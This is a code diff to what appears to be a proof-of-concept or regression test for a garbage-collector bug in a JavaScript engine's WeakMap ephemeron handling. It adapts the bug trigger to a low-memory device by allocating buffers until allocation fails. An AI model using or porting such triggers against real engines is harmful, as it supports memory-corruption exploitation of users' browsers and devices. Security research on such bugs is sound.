@@ -13,6 +13,20 @@ var initKey = { init: 1 };
 var level = 4;
 var map1 = new WeakMap();
 var GC_SIZE = 0x08000000;   // 128 MB; upstream 0x7fe00000 (2 GB)
+var CHUNK = 0x04000000;     // 64 MB; allocated until failure to force a full GC
+
+// Upstream provokes a 2 GB allocation FAILURE, which is what drives a full
+// mark-compact. This device cannot reach 2 GB, so the failure is manufactured by
+// allocating chunks until the allocator refuses, then releasing them.
+function forceAllocationFailure() {
+  var held = [];
+  var chunks = 0;
+  try {
+    while (chunks < 64) { held.push(new ArrayBuffer(CHUNK)); chunks++; }
+  } catch (e) { /* expected: this is the trigger */ }
+  held = null;
+  return chunks;
+}
 
 function hideWeakMap(map, level, initKey) {
   let prevMap = map;
@@ -77,7 +91,7 @@ for (var r = 0; r < rounds; r++) {
     // entries and changes the ephemeron ordering the bug depends on.
     map1 = new WeakMap();
     var refs = setUpWeakMap(map1);
-    new ArrayBuffer(GC_SIZE);
+    forceAllocationFailure();
     let hiddenKey = getHiddenKey(map1, level, initKey);
     let hiddenMap = map1.get(hiddenKey);
     let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
